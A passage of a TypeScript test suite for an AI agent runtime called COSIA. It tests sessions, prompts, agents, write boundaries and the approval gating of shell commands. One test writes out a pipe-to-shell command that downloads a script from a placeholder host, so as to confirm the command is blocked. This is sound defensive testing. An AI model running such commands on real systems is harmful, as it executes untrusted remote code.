import { execFile } from "node:child_process";
import { mkdir, mkdtemp, readFile, readdir, rm, symlink, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { DatabaseSync } from "node:sqlite";
import { PassThrough, Writable } from "node:stream";
import { promisify } from "node:util";
import { afterEach, describe, expect, it } from "vitest";
import { AgentManager, formatAgentRecommendation } from "../src/runtime/agent_manager.js";
import { CapabilityPlanner, EnvironmentDiscovery, capabilityScanJson, legacyEnvironmentScanId, normalizeCapabilityProposal, stableJsonStringify } from "../src/runtime/capability.js";
import { applyReset, formatResetResult, previewReset, repairDoctor } from "../src/runtime/doctor.js";
import { initProject } from "../src/runtime/init_project.js";
import { calculateMemoryScore, formatMemoryConflicts, MemoryManager, normalizeMemoryText } from "../src/runtime/memory_manager.js";
import { formatMvpChecklist } from "../src/runtime/mvp_checklist.js";
import { modelInstructionForRetry, parseModelOutput } from "../src/runtime/model/model_provider.js";
import { ProviderError } from "../src/runtime/model/provider_errors.js";
import { checkProvider, createProvider, listProviders } from "../src/runtime/model/provider_registry.js";
import { OpenAICompatibleProvider, type FetchLike } from "../src/runtime/model/providers/openai_compatible_provider.js";
import { formatPolicyAuditEvents, PolicyAuditLog } from "../src/runtime/policy_audit.js";
import { applyPendingApproval, cancelPendingApproval, formatPendingApprovals, getPendingApprovalSummary } from "../src/runtime/pending_approvals.js";
import { normalizePolicy, PolicyManager, policyConfigSchema } from "../src/runtime/policy_manager.js";
import { buildRuntimeConfigMigration, deepMerge, formatConfigCheck, formatConfigShow, runtimeLocalPath, runtimePrivatePath, secretsPrivatePath } from "../src/runtime/runtime_config.js";
import { CodexAmendmentLedger } from "../src/runtime/codex_amendment.js";
import { buildPrompt, buildPromptBundle } from "../src/runtime/prompt_builder.js";
import { classifyMemoryCandidate, detectSecrets } from "../src/runtime/risk_classifier.js";
import { chunkTelegramMessage } from "../src/runtime/gateway_format.js";
import { gatewayProcessLockPath, sessionLockPath, withSessionLock } from "../src/runtime/gateway_locks.js";
import { formatGatewayStatus, gatewayStopRequestPath, restartGateway, startGateway, stopGateway, unlockStaleGateway, writeGatewayStopRequest } from "../src/runtime/gateway_supervisor.js";
import { pathExists } from "../src/runtime/fs_utils.js";
import { formatChatHelp, runChatRepl } from "../src/runtime/repl.js";
import { formatReviewInbox, ReviewInboxService } from "../src/runtime/review_inbox.js";
import { runSession } from "../src/runtime/runner.js";
import { SelfImprovementGovernor } from "../src/runtime/self_improvement.js";
import { formatLastTurnDebug, SessionManager } from "../src/runtime/session_manager.js";
import { assessShellRisk, buildShellApprovalRecord, ShellApprovalLedger } from "../src/runtime/shell_approval.js";
import { calculateSkillTriggerMatch, SkillManager } from "../src/runtime/skill_manager.js";
import { recommendStartSession, sessionFromChoice } from "../src/runtime/start_flow.js";
import { getStatusReport } from "../src/runtime/status_report.js";
import { classifyRuntimeBoundaryChange, classifyWritePathBoundary } from "../src/runtime/system_boundary.js";
import { codexTemplates } from "../src/runtime/templates.js";
import { RunJobLedger } from "../src/runtime/run_jobs.js";
import {
  checkTelegramGateway,
  formatTelegramCheck,
  inspectTelegramGatewayState,
  loadTelegramGatewayState,
  processTelegramUpdate,
  repairTelegramGatewayState,
  resetTelegramGatewayState,
  saveTelegramGatewayState,
  startTelegramGateway
} from "../src/runtime/telegram_gateway.js";
import { loadPrivateSecrets, savePrivateSecrets } from "../src/runtime/private_config.js";
import { formatSupportedProviders, oauthHandlerForProvider, validateProviderProfileAddOptions } from "../src/runtime/provider_onboarding.js";
import { addProviderProfile, listProviderProfileSummaries, missingProviderProfileHint, useProviderProfile } from "../src/runtime/provider_profiles.js";
import {
  addTelegramChatId,
  addTelegramMutationUserId,
  addTelegramUserId,
  enableTelegramConnector,
  removeTelegramMutationUserId,
  removeTelegramUserId,
  setTelegramGroupMode,
  setTelegramToken
} from "../src/runtime/telegram_connector_config.js";
import { ToolRegistry } from "../src/runtime/tool_registry.js";
import {
  ToolAcquisitionManager,
  candidateContentHash,
  formatToolCandidate,
  formatToolDraftResult,
  listEffectiveActiveModelToolIds,
  type ToolCandidateRecord
} from "../src/runtime/tool_acquisition.js";
import {
  ToolGrowthManager,
  formatToolGrowthReview,
  formatToolGrowthRoutine,
  formatToolGrowthStart
} from "../src/runtime/tool_growth.js";
import type { ModelProvider } from "../src/runtime/types.js";
import { findWorkspaceRoot, requireWorkspaceRoot } from "../src/runtime/workspace.js";

const tempRoots: string[] = [];
const execFileAsync = promisify(execFile);

function captureWritable(): { stream: Writable; read: () => string } {
  let text = "";
  return {
    stream: new Writable({
      write(chunk, _encoding, callback) {
        text += chunk.toString();
        callback();
      }
    }),
    read: () => text
  };
}

afterEach(async () => {
  for (const root of tempRoots.splice(0)) {
    await rm(root, { recursive: true, force: true });
  }
});

async function workspace(): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), "cosia-"));
  tempRoots.push(root);
  return root;
}

async function initializedWorkspace(): Promise<string> {
  const root = await workspace();
  await initProject(root);
  return root;
}

async function waitForCondition(predicate: () => boolean | Promise<boolean>, timeoutMs = 2000): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (await predicate()) return;
    await new Promise((resolve) => setTimeout(resolve, 10));
  }
  expect(await predicate()).toBe(true);
}

async function writeRuntimeLocal(root: string, value: unknown): Promise<void> {
  await mkdir(join(root, "config"), { recursive: true });
  await writeFile(runtimeLocalPath(root), `${JSON.stringify(value, null, 2)}\n`, "utf8");
}

function normalizeText(value: string): string {
  return value.replace(/\r\n/g, "\n");
}

function jsonResponse(body: unknown, status = 200): Response {
  return new Response(JSON.stringify(body), {
    status,
    headers: {
      "content-type": "application/json"
    }
  });
}

function configuredOpenAIProvider(fetchImpl: FetchLike, overrides: Partial<ConstructorParameters<typeof OpenAICompatibleProvider>[0]> = {}): OpenAICompatibleProvider {
  process.env.COSIA_TEST_KEY = process.env.COSIA_TEST_KEY ?? "test-key";
  return new OpenAICompatibleProvider({
    enabled: true,
    baseUrl: "https://example.invalid",
    model: "test-model",
    apiKeyEnv: "COSIA_TEST_KEY",
    endpointPath: "/chat/completions",
    timeoutMs: 1000,
    structuredRetryCount: 1,
    maxPromptChars: 60000,
    fetchImpl,
    ...overrides
  });
}

describe("runtime setup", () => {
  it("creates Codex templates, an agent, and a session", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    const manifest = await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Design the runtime MVP");

    expect(manifest.allowedTools).toEqual(expect.arrayContaining([
      "read_file",
      "write_file",
      "search_files",
      "review_inbox_read",
      "shell_request"
    ]));
    expect(session.id).toMatch(/^session_\d{8}_001$/);
    expect(session.assignedAgentId).toBe("architect-agent");
    const sessionJson = JSON.parse(await readFile(join(root, "sessions", session.id, "session.json"), "utf8")) as Record<string, unknown>;
    expect(sessionJson.assignedAgentId).toBe("architect-agent");
    expect(sessionJson.agentId).toBeUndefined();
    expect(await readFile(join(root, "codex", "SECURITY.md"), "utf8")).toContain("SECURITY");
    const policyJson = await readFile(join(root, "codex", "POLICY.json"), "utf8");
    expect(policyJson).toContain("\"version\": \"0.52.0\"");
    expect(policyJson).toContain("\"defaultAgentId\": \"cosia-agent\"");
    expect(policyJson).not.toContain("\"promptBudget\"");
    const policyLaw = JSON.parse(policyJson) as { tools: Record<string, unknown> };
    expect(policyLaw.tools.git_status).toBeUndefined();
    expect(policyLaw.tools.git_diff).toBeUndefined();
    expect(policyLaw.tools.git_log).toBeUndefined();
    expect(policyLaw.tools.npm_test).toBeUndefined();
    expect(policyLaw.tools.npm_typecheck).toBeUndefined();
    expect(await pathExists(join(root, "config", "runtime.defaults.json"))).toBe(true);
    const runtimeDefaults = JSON.parse(await readFile(join(root, "config", "runtime.defaults.json"), "utf8")) as {
      tools: { bundled: Record<string, { enabled: boolean }> };
    };
    expect(runtimeDefaults.tools.bundled).toEqual({});
    const cosiaAgent = await agents.loadAgent("cosia-agent");
    expect(cosiaAgent.identity.role).toContain("Default COSIA agent");
    const cosiaManifestPath = join(root, "agents", "cosia-agent", "manifest.json");
    const cosiaManifestJson = JSON.parse(await readFile(cosiaManifestPath, "utf8")) as { allowedTools: string[] };
    cosiaManifestJson.allowedTools = cosiaManifestJson.allowedTools.filter((tool) => tool !== "shell_request");
    await writeFile(cosiaManifestPath, `${JSON.stringify(cosiaManifestJson, null, 2)}\n`, "utf8");
    expect((await agents.loadAgent("cosia-agent")).allowedTools).not.toContain("shell_request");
    expect(await readFile(join(root, "skills", "SKILLS.md"), "utf8")).toContain("generated by COSIA");
    expect(await readFile(join(root, "sessions", session.id, "POLICY_AUDIT.jsonl"), "utf8")).toBe("");
    expect(await readFile(join(root, "sessions", session.id, "SESSION_SUMMARY.md"), "utf8")).toContain("SESSION SUMMARY");
    expect(await readFile(join(root, "sessions", session.id, "PROMPT_MANIFEST.jsonl"), "utf8")).toBe("");
    expect(await readFile(join(root, "sessions", session.id, "CONTEXT_ARCHIVE.md"), "utf8")).toContain("CONTEXT ARCHIVE");
    const memory = new MemoryManager(root);
    expect(memory.listPromotions()).toEqual([]);
    expect(memory.exportCandidatesJsonl()).toBe("");
  });

  it("keeps checked-in Codex docs aligned with fresh init templates", async () => {
    const root = await initializedWorkspace();
    for (const [fileName, template] of Object.entries(codexTemplates)) {
      const initialized = await readFile(join(root, "codex", fileName), "utf8");
      const checkedIn = await readFile(join(process.cwd(), "codex", fileName), "utf8");
      expect(normalizeText(initialized)).toBe(normalizeText(template));
      expect(normalizeText(checkedIn)).toBe(normalizeText(template));
    }
  });

  it("builds prompts in the required order", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    const agent = await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Design the runtime MVP");
    const prompt = await buildPrompt({ workspaceRoot: root, agent, session, userPrompt: "Hello" });

    const order = [
      "codex/SECURITY.md",
      "codex/POLICY.md",
      "codex/RULES.md",
      "codex/SOUL.md",
      "codex/USER.md",
      "AGENT IDENTITY (JSON)",
      "AGENT SUPPLEMENTARY PROFILE",
      "AGENT STYLE",
      "AGENT LOCAL RULES",
      "sessions/",
      "CURRENT USER REQUEST"
    ];
    let cursor = -1;
    for (const marker of order) {
      const next = prompt.indexOf(marker, cursor + 1);
      expect(next).toBeGreaterThan(cursor);
      cursor = next;
    }
    expect(prompt).toContain("Available tools for this run:");
    expect(prompt).toContain("shell_request");
    expect(prompt).toContain("shell_request does not execute commands");
    expect(prompt).toContain("Static prompt blocks such as AGENT STYLE");
    expect(prompt).toContain("prompt-loaded context snapshots");
    expect(prompt).toContain("current active toolset cannot inspect that runtime surface");
    expect(prompt).toContain("ask for permission to start the guided tool-growth routine");
    expect(prompt).toContain("Should I start the tool creation routine?");
    expect(prompt).toContain("Do not tell the user to run a slash or CLI command");
    expect(prompt).toContain("Hash-prefixed commands are not part of the runtime command surface");

    const policy = await new PolicyManager(root).loadPolicy();
    policy.disabledPermissions = [...policy.disabledPermissions, "shell_request"];
    const shellRequestDisabledPrompt = await buildPrompt({ workspaceRoot: root, agent, session, userPrompt: "Hello", policy });
    const activeToolsLine = shellRequestDisabledPrompt
      .split(/\r?\n/)
      .find((line) => line.startsWith("Available tools for this run:")) ?? "";
    expect(activeToolsLine).toContain("review_inbox_read");
    expect(activeToolsLine).not.toContain("shell_request");
    expect(shellRequestDisabledPrompt).toContain("read_file");
  });

  it("repairs legacy session agentId and supports assignment filters", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Repair legacy session");
    const sessionPath = join(root, "sessions", session.id, "session.json");
    const legacy = {
      id: session.id,
      agentId: "architect-agent",
      status: "active",
      goal: session.goal,
      createdAt: session.createdAt,
      updatedAt: session.updatedAt
    };
    await writeFile(sessionPath, `${JSON.stringify(legacy, null, 2)}\n`, "utf8");

    const repaired = await sessions.loadSession(session.id);
    expect(repaired.assignedAgentId).toBe("architect-agent");
    const repairedJson = JSON.parse(await readFile(sessionPath, "utf8")) as Record<string, unknown>;
    expect(repairedJson.assignedAgentId).toBe("architect-agent");
    expect(repairedJson.agentId).toBeUndefined();

    await sessions.assignAgent(session.id, null);
    expect((await sessions.loadSession(session.id)).assignedAgentId).toBeNull();
    expect(await sessions.listSessions({ agentId: "architect-agent" })).toHaveLength(0);

    await sessions.assignAgent(session.id, "cosia-agent");
    const filtered = await sessions.listSessions({ agentId: "cosia-agent" });
    expect(filtered.map((item) => item.id)).toEqual([session.id]);
  });

  it("applies prompt budget metadata and context tailing", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    const agent = await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Budget prompt assembly");
    await sessions.appendContext(session.id, "x".repeat(10000));
    const policy = await new PolicyManager(root).loadPolicy();
    policy.promptBudget = {
      ...policy.promptBudget,
      maxPromptChars: 12000,
      contextTailChars: 2000,
      refMemoryMaxItems: 8,
      toolResultsMaxChars: 2000
    };

    const result = await buildPromptBundle({
      workspaceRoot: root,
      agent,
      session,
      userPrompt: "Hello",
      policy
    });

    expect(result.prompt).toContain("CURRENT USER REQUEST");
    expect(result.prompt).toContain("CONTEXT_MEMORY.md truncated to latest 2000 chars");
    expect(result.manifest.promptChars).toBe(result.prompt.length);
    expect(result.manifest.estimatedTokens).toBeGreaterThan(0);
    expect(result.manifest.safetyMarginChars).toBeGreaterThan(0);
  });

  it("reads prompt manifests and archives the latest context entry", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Prompt manifest polish");

    await sessions.appendContext(session.id, "## Run 2026-01-01T00:00:00.000Z\n\nPrompt:\nfirst\n");
    await sessions.appendContext(session.id, "## Run 2026-01-01T00:01:00.000Z\n\nPrompt:\nsecond\n");
    const result = await sessions.undoLastContextEntry(session.id, "wrong prompt");
    expect(result.moved).toBe(true);

    const context = await readFile(join(root, "sessions", session.id, "CONTEXT_MEMORY.md"), "utf8");
    const archive = await readFile(join(root, "sessions", session.id, "CONTEXT_ARCHIVE.md"), "utf8");
    expect(context).toContain("first");
    expect(context).not.toContain("second");
    expect(archive).toContain("wrong prompt");
    expect(archive).toContain("second");

    const emptySession = await sessions.createSession("architect-agent", "No context");
    await expect(sessions.undoLastContextEntry(emptySession.id, "nothing")).resolves.toMatchObject({ moved: false });
  });

  it("reports missing and present last-turn debug records", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Debug inspection");

    await expect(sessions.readLastTurnDebug(session.id)).resolves.toBeNull();

    await sessions.writeLastTurnDebug(session.id, {
      userMessage: "User asked for debug visibility.",
      prompt: `Prompt header\n${"x".repeat(80)}`,
      providerPrompt: "Provider instructions\nProvider input",
      runId: "run_debug_1",
      modelStep: 2,
      promptChars: 94,
      estimatedTokens: 24,
      timestamp: "2026-05-24T00:00:00.000Z"
    });
    await writeFile(
      join(root, "sessions", session.id, "debug", "LAST_PROVIDER_RESPONSE.md"),
      "# LAST PROVIDER RESPONSE\n\ncachedTokens: 1024\n"
    );

    const record = await sessions.readLastTurnDebug(session.id);
    expect(record?.metadata).toMatchObject({
      runId: "run_debug_1",
      modelStep: 2,
      promptChars: 94,
      estimatedTokens: 24
    });
    expect(formatLastTurnDebug(record!, { part: "metadata" })).toContain("Layer: diagnostic record, not memory.");
    expect(formatLastTurnDebug(record!, { part: "user-message" })).toContain("User asked for debug visibility.");
    const promptOutput = formatLastTurnDebug(record!, { part: "prompt", maxChars: 30 });
    expect(promptOutput).toContain("[truncated: showing 30 of");
    expect(formatLastTurnDebug(record!, { part: "provider-prompt" })).toContain("Provider instructions");
    expect(formatLastTurnDebug(record!, { part: "provider-response" })).toContain("cachedTokens: 1024");
    const allOutput = formatLastTurnDebug(record!, { part: "all", maxChars: 30 });
    expect(allOutput).toContain("# Last user message");
    expect(allOutput).toContain("# Last prompt");
    expect(allOutput).toContain("# Last provider prompt");
    expect(allOutput).toContain("# Last provider response");
    expect(allOutput).toContain("[truncated: showing 30 of");
  });

  it("reports context status and compacts run blocks into archive", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Context maintenance");

    await sessions.appendContext(session.id, "## Run 2026-01-01T00:00:00.000Z\n\nPrompt:\nfirst\n\nFinal:\none\n");
    await sessions.appendContext(session.id, "## Run 2026-01-01T00:01:00.000Z\n\nPrompt:\nsecond\n\nFinal:\ntwo\n");
    await sessions.appendContext(session.id, "## Run 2026-01-01T00:02:00.000Z\n\nPrompt:\nthird\n\nFinal:\nthree\n");

    const status = await sessions.contextStatus(session.id, { warningChars: 1, criticalChars: 100000 });
    expect(status.level).toBe("warning");
    expect(status.runEntryCount).toBe(3);
    expect(status.summaryIsPlaceholder).toBe(true);
    expect(status.compactRecommended).toBe(true);

    const blocked = await sessions.compactContext(session.id, {
      keepLast: 1,
      reason: "needs summary",
      apply: true
    });
    expect(blocked.blocked).toBe(true);

    await sessions.updateSummary(session.id, "The session tested context compaction.");
    const preview = await sessions.compactContext(session.id, {
      keepLast: 1,
      reason: "manual compact",
      apply: false
    });
    expect(preview.applied).toBe(false);
    expect(preview.archivedRuns).toBe(2);
    expect(await readFile(join(root, "sessions", session.id, "CONTEXT_MEMORY.md"), "utf8")).toContain("first");

    const applied = await sessions.compactContext(session.id, {
      keepLast: 1,
      reason: "manual compact",
      apply: true
    });
    expect(applied.applied).toBe(true);
    expect(applied.archivedRuns).toBe(2);

    const context = await readFile(join(root, "sessions", session.id, "CONTEXT_MEMORY.md"), "utf8");
    const archive = await readFile(join(root, "sessions", session.id, "CONTEXT_ARCHIVE.md"), "utf8");
    expect(context).toContain("# CONTEXT MEMORY");
    expect(context).not.toContain("Prompt:\nfirst");
    expect(context).not.toContain("Prompt:\nsecond");
    expect(context).toContain("Prompt:\nthird");
    expect(archive).toContain("Reason: manual compact");
    expect(archive).toContain("Archived runs: 2");
    expect(archive).toContain("Prompt:\nfirst");
    expect(archive).toContain("Prompt:\nsecond");
  });

  it("records context health metadata in prompt manifests", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    const agent = await agents.loadAgent("cosia-agent");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Context manifest");
    await sessions.appendContext(session.id, "## Run 2026-01-01T00:00:00.000Z\n\nPrompt:\nfirst\n");
    await sessions.appendContext(session.id, "## Run 2026-01-01T00:01:00.000Z\n\nPrompt:\nsecond\n");
    const policy = await new PolicyManager(root).loadPolicy();
    policy.promptBudget = {
      ...policy.promptBudget,
      contextWarningChars: 1,
      contextCriticalChars: 100000
    };

    const result = await buildPromptBundle({
      workspaceRoot: root,
      agent,
      session,
      userPrompt: "summarize context",
      policy
    });

    expect(result.manifest.context).toMatchObject({
      healthLevel: "warning",
      summaryIsPlaceholder: true,
      compactRecommended: true
    });
  });
});

describe("agents", () => {
  it("creates a default COSIA agent, bootstraps custom agents, and manages defaults", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    const policyManager = new PolicyManager(root);
    const initialPolicy = await policyManager.loadPolicy();

    expect(initialPolicy.agents.defaultAgentId).toBe("cosia-agent");
    expect((await agents.loadAgent("cosia-agent")).identity.voice).toContain("Warm");

    const custom = await agents.bootstrapAgent({
      id: "helper-agent",
      name: "Helper Agent",
      role: "Helps with general COSIA operations.",
      voice: "Friendly and brief.",
      priorities: ["session continuity", "clear next steps"],
      boundaries: ["do not bypass policy"]
    });
    expect(custom.identity.priorities).toContain("session continuity");
    await policyManager.setDefaultAgent(custom.id);
    expect((await policyManager.loadPolicy()).agents.defaultAgentId).toBe("helper-agent");
  });

  it("protects default, last, and session-referenced agents during deletion", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    const policyManager = new PolicyManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Keep referenced agent");

    const preview = await agents.deleteAgent("cosia-agent", {
      defaultAgentId: "cosia-agent"
    });
    expect(preview.changed).toBe(false);
    await expect(agents.deleteAgent("cosia-agent", {
      yes: true,
      defaultAgentId: "cosia-agent"
    })).rejects.toThrow("Cannot delete default agent");

    await expect(agents.deleteAgent("architect-agent", {
      yes: true,
      defaultAgentId: "cosia-agent"
    })).rejects.toThrow(session.id);
    const forced = await agents.deleteAgent("architect-agent", {
      yes: true,
      force: true,
      defaultAgentId: "cosia-agent"
    });
    expect(forced.changed).toBe(true);

    await expect(agents.deleteAgent("cosia-agent", {
      yes: true,
      force: true,
      defaultAgentId: "cosia-agent"
    })).rejects.toThrow("--force --allow-empty");
    const empty = await agents.deleteAgent("cosia-agent", {
      yes: true,
      force: true,
      allowEmpty: true,
      defaultAgentId: "cosia-agent"
    });
    expect(empty.changed).toBe(true);
    await policyManager.setDefaultAgent(null);
    expect(await agents.listAgents()).toEqual([]);
    expect((await policyManager.loadPolicy()).agents.defaultAgentId).toBeNull();
  });

  it("recommends agents deterministically without mutating session state", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const policy = await new PolicyManager(root).loadPolicy();

    const architectureRows = await agents.recommendAgent({
      prompt: "구현 계획을 설계해줘",
      defaultAgentId: policy.agents.defaultAgentId
    });
    expect(architectureRows[0]).toMatchObject({
      agentId: "architect-agent",
      status: "SELECTED"
    });

    const defaultRows = await agents.recommendAgent({
      prompt: "일반 대화",
      defaultAgentId: policy.agents.defaultAgentId
    });
    expect(defaultRows[0]?.agentId).toBe("cosia-agent");
    expect(formatAgentRecommendation(defaultRows)).toContain("Agent");

    const cosiaRows = await agents.recommendAgent({
      prompt: "세션 상태를 정리해줘",
      defaultAgentId: policy.agents.defaultAgentId
    });
    expect(cosiaRows[0]).toMatchObject({
      agentId: "cosia-agent",
      totalScore: 5
    });
  });
});

describe("tools and policy", () => {
  it("denies writes outside the workspace and delegates routine local overwrites", async () => {
    const root = await initializedWorkspace();
    const registry = new ToolRegistry();
    await writeFile(join(root, "existing.txt"), "old", "utf8");

    const outside = await registry.execute("write_file", { path: "../outside.txt", content: "bad" }, {
      workspaceRoot: root,
      allowedTools: ["write_file"]
    });
    expect(outside.ok).toBe(false);
    expect(outside.content).toContain("outside workspace");

    const overwrite = await registry.execute("write_file", { path: "existing.txt", content: "new" }, {
      workspaceRoot: root,
      allowedTools: ["write_file"],
      approveOverwrite: async () => false
    });
    expect(overwrite.ok).toBe(true);
    expect(overwrite.content).toContain("Wrote existing.txt");
    expect(await readFile(join(root, "existing.txt"), "utf8")).toBe("new");

    const remoteOverwrite = await registry.execute("write_file", { path: "existing.txt", content: "remote" }, {
      workspaceRoot: root,
      allowedTools: ["write_file"],
      forceOverwriteApproval: true,
      approveOverwrite: async () => false
    });
    expect(remoteOverwrite.ok).toBe(false);
    expect(remoteOverwrite.content).toContain("Overwrite denied");
    expect(await readFile(join(root, "existing.txt"), "utf8")).toBe("new");
  });

  it("classifies system boundary writes separately from delegated behavior files", async () => {
    const root = await initializedWorkspace();
    const policy = await new PolicyManager(root).loadPolicy();

    expect(classifyWritePathBoundary(root, "codex/RULES.md", policy)).toMatchObject({
      level: "codex_amendment",
      operation: "codex_self_amendment"
    });
    expect(classifyWritePathBoundary(root, "config/runtime.private.json", policy)).toMatchObject({
      level: "final_user_approval",
      operation: "system_level_boundary_change"
    });
    expect(classifyWritePathBoundary(root, "agents/cosia-agent/manifest.json", policy)).toMatchObject({
      level: "final_user_approval",
      operation: "system_level_boundary_change"
    });
    expect(classifyWritePathBoundary(root, "agents/cosia-agent/STYLE.md", policy)).toMatchObject({
      level: "delegated",
      operation: "agent_behavior_update"
    });
    expect(classifyRuntimeBoundaryChange("provider_authority")).toMatchObject({
      level: "final_user_approval",
      operation: "system_level_boundary_change"
    });
    expect(classifyRuntimeBoundaryChange("connector_authority")).toMatchObject({
      level: "final_user_approval",
      operation: "system_level_boundary_change"
    });
    expect(classifyRuntimeBoundaryChange("permission_boundary")).toMatchObject({
      level: "final_user_approval",
      operation: "system_level_boundary_change"
    });
    expect(classifyRuntimeBoundaryChange("ordinary_workspace_file")).toMatchObject({
      level: "delegated",
      operation: "workspace_local_file_write"
    });
  });

  it("reads and searches workspace files", async () => {
    const root = await initializedWorkspace();
    const registry = new ToolRegistry();
    await writeFile(join(root, "note.txt"), "Codex Agent Session", "utf8");
    await writeFile(join(root, "package.json"), "{\"bin\":{\"cosia\":\"dist/src/cli.js\"}}", "utf8");
    await mkdir(join(root, "src"), { recursive: true });
    await writeFile(join(root, "src", "cli.ts"), "program.command(\"status\")", "utf8");

    const read = await registry.execute("read_file", { path: "note.txt" }, {
      workspaceRoot: root,
      allowedTools: ["read_file"]
    });
    expect(read).toEqual({ ok: true, content: "Codex Agent Session" });

    const search = await registry.execute("search_files", { query: "Agent" }, {
      workspaceRoot: root,
      allowedTools: ["search_files"]
    });
    expect(search.ok).toBe(true);
    expect(search.content).toContain("note.txt");

    const pathSearch = await registry.execute("search_files", { query: "현재 구현된 CLI 명령" }, {
      workspaceRoot: root,
      allowedTools: ["search_files"]
    });
    expect(pathSearch.ok).toBe(true);
    expect(pathSearch.content).toContain("Path matches:");
    expect(pathSearch.content).toContain("src/cli.ts");

    const combinedPathSearch = await registry.execute("search_files", { query: "package.json README src/index src/cli bin" }, {
      workspaceRoot: root,
      allowedTools: ["search_files"]
    });
    expect(combinedPathSearch.ok).toBe(true);
    expect(combinedPathSearch.content).toContain("package.json");
    expect(combinedPathSearch.content).toContain("src/cli.ts");
  });

  it("marks search fallback early stops when hard limits are reached", async () => {
    const root = await initializedWorkspace();
    const directory = join(root, "many-files");
    await mkdir(directory, { recursive: true });
    await Promise.all(Array.from({ length: 1005 }, (_, index) => writeFile(join(directory, `file-${index}.txt`), "plain text", "utf8")));
    const registry = new ToolRegistry();

    const result = await registry.execute("search_files", { query: "missing-query-for-fallback", directory: "many-files" }, {
      workspaceRoot: root,
      allowedTools: ["search_files"]
    });

    expect(result.ok).toBe(true);
    expect(result.content).toContain("[COSIA: search fallback stopped early, reason=max_files]");
  });

  it("creates shell_request approvals without executing commands", async () => {
    const root = await initializedWorkspace();
    const registry = new ToolRegistry();
    const result = await registry.execute("shell_request", {
      command: "node --version",
      reason: "Verify shell bridge preview behavior."
    }, {
      workspaceRoot: root,
      allowedTools: ["shell_request"],
      sessionId: "session_test",
      agentId: "cosia-agent"
    });
    expect(result.ok).toBe(true);
    expect(result.content).toContain("[PREVIEW]");
    expect(result.content).toContain("Shell command approval created");

    const db = new DatabaseSync(join(root, "memory", "longterm.sqlite"));
    const row = db.prepare("SELECT status FROM shell_approvals").get() as { status: string };
    db.close();
    expect(row.status).toBe("pending");
  });

  it("gates shell_request through agent allowlists and shell_request permission", async () => {
    const root = await initializedWorkspace();
    const registry = new ToolRegistry();

    const notAllowed = await registry.execute("shell_request", {
      command: "node --version",
      reason: "Verify allowlist gate."
    }, {
      workspaceRoot: root,
      allowedTools: []
    });
    expect(notAllowed.ok).toBe(false);
    expect(notAllowed.content).toContain("not allowed for this agent");

    const policyPath = join(root, "codex", "POLICY.json");
    const rawPolicy = JSON.parse(await readFile(policyPath, "utf8")) as { disabledPermissions: string[] };
    rawPolicy.disabledPermissions = [...rawPolicy.disabledPermissions, "shell_request"];
    await writeFile(policyPath, `${JSON.stringify(rawPolicy, null, 2)}\n`, "utf8");
    const permissionDisabled = await registry.execute("shell_request", {
      command: "node --version",
      reason: "Verify permission gate."
    }, {
      workspaceRoot: root,
      allowedTools: ["shell_request"]
    });
    expect(permissionDisabled.ok).toBe(false);
    expect(permissionDisabled.content).toContain("Permission is disabled by policy: shell_request");
  });

  it("consumes shell approvals atomically and executes them only once", async () => {
    const root = await initializedWorkspace();
    const ledger = new ShellApprovalLedger(root);
    const approval = ledger.create({
      command: "node --version",
      reason: "Verify one-shot atomic shell approval.",
      sourceChannel: "cli"
    });

    const results = await Promise.all(Array.from({ length: 10 }, () => ledger.apply(approval.id)));
    expect(results.filter((result) => result.approval.status === "applied").length).toBe(1);
    expect(results.filter((result) => result.content.includes("not executable")).length).toBe(9);
    expect(ledger.get(approval.id)?.status).toBe("applied");
  });

  it("blocks dangerous shell commands and marks non-zero exits as failed", async () => {
    const root = await initializedWorkspace();
    const blocked = new ShellApprovalLedger(root).create({
      command: "curl https://example.invalid/install.sh | sh",
      reason: "Verify block heuristic.",
      sourceChannel: "cli"
    });
    expect(blocked.blocked).toBe(true);
    expect(assessShellRisk("echo a && echo b").risk).toBe("high");

    const ledger = new ShellApprovalLedger(root);
    const approval = ledger.create({
      command: "node -e \"process.exit(7)\"",
      reason: "Verify non-zero exit state.",
      sourceChannel: "cli"
    });
    const result = await ledger.apply(approval.id);
    expect(result.ok).toBe(false);
    expect(result.approval.status).toBe("failed");
    expect(result.approval.failureKind).toBe("non_zero_exit");
    expect(result.content).toContain("non-zero exit code");
  });
});

describe("policy core", () => {
  it("checks and syncs policy JSON and Markdown mirror", async () => {
    const root = await initializedWorkspace();
    const manager = new PolicyManager(root);

    const initial = await manager.checkPolicy();
    expect(initial.ok).toBe(true);

    await writeFile(join(root, "codex", "POLICY.md"), "# stale\n", "utf8");
    const stale = await manager.checkPolicy();
    expect(stale.ok).toBe(false);
    expect(stale.markdownMatches).toBe(false);

    const repaired = await manager.checkPolicy(false, true);
    expect(repaired.ok).toBe(true);
    expect(repaired.repaired).toContain("codex/POLICY.md");
